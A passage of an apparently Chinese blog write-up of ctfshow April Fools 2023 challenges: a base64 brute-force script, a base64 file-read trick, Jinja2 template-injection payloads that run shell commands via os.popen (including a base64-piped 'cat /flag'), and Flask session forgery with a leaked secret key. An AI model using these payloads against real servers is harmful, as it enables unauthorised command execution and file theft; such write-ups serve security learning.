string">"5li65lqg6ziy5q2i5asn5a625oml5yqo5pon5l2c5oir5bey57up5oqk5byx6i6x6zibkgzsywcp6jep5zyo6l+z5q616k+d55qe5p+q5liq5zyw5pa55lqg77ym5l2g5lus5lin5lia5a6a5om+5b6x5yiw5zof77ym5zi75zi75zi744cc5awx56we5p2l5pwy5l2g5a626zeo77ym5bim552a56ev57sv5zkm54m55b6b77ym5z2m55m95luo5a695oqx5ous5luo5lil77ym5lin5zcs6k+d57uz5l2g5omt5lia6zki44cckgzsywcp5zyo5zoq6yem5zgakgzsywcp5zyo5zoq6yem77ymkgzsywcp5zyo6ykj5bcp5pyl5y+l55qe55y8552b6yem44cc5asp5a+55zyw77ym6zuo5a+56aoo44cc5asn6zmg5a+56zw/56m644cc5bgx6iqx5a+55rw35qcr77ym6lwk5pel5a+56iun56m544cc6zu36zqq6zqq77ym6zu+6jkz6jkz44cc5bya5bic5asn5zcj5lih5lql5lqo6yca44cc5bmz5lue5bmz5lue5bmz5bmz5lue77ym5lue5bmz5lue5bmz5lue5lue5bmz77ym5lue5lue5bmz44cc5lyx5oma5zgo55+l77ymj2n0znnob3cn55qekgzsywcp5yw35ash5lul5lil5yeg5liq54m554k577ym5lia5piv5lulj2n0znnob3cn5bya5as077ym5zco6z2i6lef552a6iqx5ous5y+35zkm5yeg5liq5awh5ocq55qe5lic6kw/77ym6ykj5liq5lic6kw/5y+r5ygaj3v1awqn77ym5li65lua5lmi5ymn6z2i6kab6k+06l+z5lmi5asa5bqf6k+d5zgi5piv5zug5li65lih5lia5lin6k+05bqf6k+d6l+z5liq6aky5bcx5asq5aw95yga5lqg6l+z5oco5lmi5y+v5lul5zgi77ym5lih5lia5pyj5lq65oqk6l+z5liq5lic6kw/5ps+5zyoy3lizxjjagvm6yem5lia5oqk5qkt5l2g5piv5qkt5lin5ye65p2l77ym54s25zco5yan57uz5oir6l+z5lmi5lia5liq6iux5pah5a2x5q+n5lia5liq6iux5pah5a2x5q+n55qe5ps55asn5bcp5yaz77ym6l+z5oco5lmi6io96kgm5zgi77ym6l+z6ikv5a6a5piv5lin6kgm55qe5a+55lin5a+5iwn0znnob3d7ymfzzty0xzfz5asq6zq+5lqgisfj5pyn5lqgvsf95oma5lul5oir6l+z5zue5zc45y+w5pwz6k6t77ym5zyo5ymn5zco6yo95yqg5lqg5lia54k554k55lic5lic77ym6l+z5qc35bcx5lin6io95pyj5bii5ykf5oml5yqo5p2l5ps55lqg5a+55lin5a+55zga44cc5oir5y+j6kkl6yem5pyj5lia5liq5bcp6k6+5ash77ym5y+v5lul6k6/6zeu5yeg5lmo5ywo6yoo55qe5lq657g755+l6k+g44cc5oir5y2055so5a6d5lio5lin6k6k6k+g55qe5lq66l+b6kgm5q+r5peg5osp5lmj55qe5lqj6k6677ym5bm255yl5o6i5aes55qe54wn54mh44cc5b2x5zon57yw56il5pwi546h5pya5asn55qe5zug57sg77ym5lin5piv5l2/55so5l2v56en57yw56il6k+t6kia77ym6icm5piv5pio5pma5l2g55qe552h55yg5piv5zcm5ywf6laz44ccssb3b3jrighhcmqgzxzlcnlkyxkgc28gdghhdcbhbgwgd2hvigxvdmugbwugd2lsbcbizsbwcm91zcbvzibtzseh6z2i5zcr5a+56lgh57yw56il55qe6zeu6aky5piv77ym6buy6k6k5bim5pyj546v5akd44cc5l2g5y+q5ooz6kab5lia5liq6aaz6jwj77ym5l2g5piv5b6x5yiw5lqg5lia5y+q5ou/552a6aaz6jwj55qe5asn54yp54yp77ym55sa6iez6l+y5pyj5pw05liq5lib5p6x44cc5l2g5lin5piv6k6o5y6mj0phdmen77ym5l2g5y+q5piv6k6o5y6m5bel5l2c44cc6icm5bcx5zyo5q2k5pe25oir5bey57up5ooz5lin5ye66aqa6k+d5lqg6l+z5y+v5oco5lmi5yqe5zga77ym5oma5lul5oir5om+576k5y+l5b6b6zug5lqg5lia5lqb6aqa6k+d6l+z5qc35oir5bcx5lin55so57un57ut56cb5a2x5lqg44cctmlnahqgaxmgbmv2zxigzgfyay5jbib0agugbmlnahqsqwxiaxp6awegaxmgc3rpbgwgcmvkllrozsbqbhvzacbxaxn0zxjpysbpcybzdglsbcbwdxjwbgutd2hpdguusxqgagfzig5vdghpbmcgdg8gzg8gd2l0acbuawdodcbvcibkyxkutglrzsxjig1pc3mgew91lel0ighhcybub3roaw5nihrvigrvihdpdgggc3vuc2hpbmugb3igcmfpbi5jdcbkb2vzbid0igv2zw4gbwf0dgvyiglmihlvdsbrbm93ig9yigrvbid0igtub3cuqwx0ag91z2ggssb3awxsihryesb0bybszxqgew91igtub3csvghpbmsgb2ygaxquu28gssbyzwpvawnlzc4g6bur5asc5yw25a6e5luo5p2l5bcx5lin5piv6bur55qe77ym6bur5asc6yem77ym5zci5qyi6iqx6l+y5piv57qi55qe44cc5q+b57us57us55qe57sr6jek6iqx6l+y5piv57sr55m96imy55qe77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o744cc5bcx5yop77ym5oir5ooz5l2g77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o777ym5zkm5pm05asp5zkm5lil6zuo5rkh5pyj5ywz57o777ym55sa6iez5zkm5l2g55+l6ygt5lin55+l6ygt6yo95rkh5pyj5ywz57o777ym5bc9566h5oir6l+y5piv5lya5bc96yep6k6p5l2g55+l6ygt77ym5ooz5yiw6l+z6yem77ym5lqo5piv5qyi5zac44cc"</span><span class="token keyword">def</span> <span class="token function">check_4</span><span class="token punctuation">(</span>base64_part<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#base64的原理是3个字符转化成4个字符，也就是4位base64正好对应3个原文，这里检查原文是否在可见字符范围内。</span>        _temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        results<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> base64_part<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        _temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>base64_part<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>base64_part<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                        _temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>base64_part<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>base64_part<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">set</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                s<span class="token operator">=</span><span class="token string">'%s%s%s%s'</span><span class="token operator">%</span>i                <span class="token keyword">try</span><span class="token punctuation">:</span>                        result<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> result<span class="token punctuation">.</span>isprintable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                        <span class="token keyword">pass</span>        <span class="token keyword">return</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span>l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>check_4<span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#print(l)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得出的东西自己组合一下得到</p><p>ctfshow{base64_1s太难了!!I服了U!}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230404004547648.png" alt="image-20230404004547648"></p><p>然后尝试  把  index.php编码  传入参数 aW5kZXgucGhw</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezg1NmQzOTVhLTE2OGUtNGUwMy05ZDBhLWU1YWEyNzQxMzc3Nn0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8&#x2F;aW1nPSIuJGltYWdlKTsKfQoKCgoK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码得</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2023-03-27 10:30:30# @Last Modified by:   h1xa# @Last Modified time: 2023-03-28 12:15:33# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;$image&#x3D;$_GET[&#39;img&#39;];$flag &#x3D; &quot;ctfshow&#123;856d395a-168e-4e03-9d0a-e5aa27413776&#125;&quot;;if(isset($image))&#123;$image &#x3D; base64_decode($image);$data &#x3D; base64_encode(file_get_contents($image));echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;png;base64,$data&#39;&#x2F;&gt;&quot;;&#125;else&#123;$image &#x3D; base64_encode(&quot;face.png&quot;);header(&quot;location:&#x2F;?img&#x3D;&quot;.$image);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ctfshow<span class="token punctuation">&#123;</span>856d395a<span class="token operator">-</span>168e<span class="token operator">-</span><span class="token number">4e03</span><span class="token operator">-</span>9d0a<span class="token operator">-</span>e5aa27413776<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>通过源代码得到app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string<span class="token punctuation">,</span>render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hellodear</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"ge"</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'hello %s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"f"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'hello %s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Nonononon'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审源码的</p><p>需要&#x2F;hello&#x2F;…来进行构造payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是题目应该过滤了   &#x2F;    然后通过十六进制绕过不成功   可以尝试用base64绕过</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">echo Y2F0IC9mbGFn <span class="token operator">|</span>base64 <span class="token operator">-</span>d<span class="token operator">|</span>shsh有时候可以换成bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"echo Y2F0IC9mbGFn |base64 -d|sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>官方wp给出的是这种payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>hello<span class="token operator">/</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__ <span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ge?ctfshow<span class="token operator">=</span>cat <span class="token operator">/</span>flag <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>首先注册账号，然后登录，在源代码里，找到 show然后可以查看源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> Responseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'S3cr3tK3y'</span>users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># Check if user is loggedin</span><span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span><span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>msg <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>session<span class="token punctuation">[</span><span class="token string">'loggedin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> usernamesession<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>msg <span class="token operator">=</span> <span class="token string">'Incorrect username/password!'</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>msg <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>msg <span class="token operator">=</span> <span class="token string">'Account already exists!'</span><span class="token keyword">else</span><span class="token punctuation">:</span>users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span>msg <span class="token operator">=</span> <span class="token string">'You have successfully registered!'</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile2.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现app.secret_key &#x3D; ‘S3cr3tK3y’</p><p>应该是session伪造</p><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406224257121.png" alt="image-20230406224257121"></p><p>然后登录到admin用户</p><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406224358823.png" alt="image-20230406224358823"></p><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406224938207.png" alt="image-20230406224938207"></p><p>可以尝试构造  filename&#x3D;app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> Responseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'S3cr3tK3y'</span>users <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'admin'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'LKHSADSFHLA;KHLK;FSDHLK;ASFD'</span><span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Check if user is loggedin</span>    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token 